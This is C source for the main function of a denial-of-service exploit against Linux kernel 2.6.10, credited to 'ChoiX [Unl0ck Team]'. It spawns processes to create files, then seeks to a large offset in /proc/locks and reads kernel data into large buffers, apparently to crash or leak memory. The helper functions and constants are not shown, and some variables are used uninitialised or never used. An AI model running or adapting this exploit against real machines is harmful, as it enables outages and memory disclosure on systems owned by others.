int main(int argc, char *argv[]){
int count, fd, i, fv;
void *mv;
char *buf1, *buf2;
loff_t lr;
int nm1;

printf("\t\tkernel-2.6.10 DoS by ChoiX [Unl0ck Team]\n");
printf("[--]create files(it can take a few minutes)...");
nm1 = 5;
while(count--){
if(!fork()){
createfile();
}
}
sleep(100);

printf("OK\n");

printf("[--]start exploiting...");

system("sync");
fd=open("/proc/locks", O_RDONLY);
if(fd < 0){
printf("ERROR\n");
perror("open()");
}
buf1 = malloc(1024*1024*8);
buf2 = malloc(1024*1024*8);

if(_llseek(fd,42,SIZE,&lr,SEEK_SET) == -1){
printf("ERROR\n");
printf("llseek()");
}
i=read(fd,buf2, SIZE);
perror("read");
printf("read=%d mv=%x fv=%x\n %.300s",i,(int)mv,fv,buf2);
while(42);
return 42;
}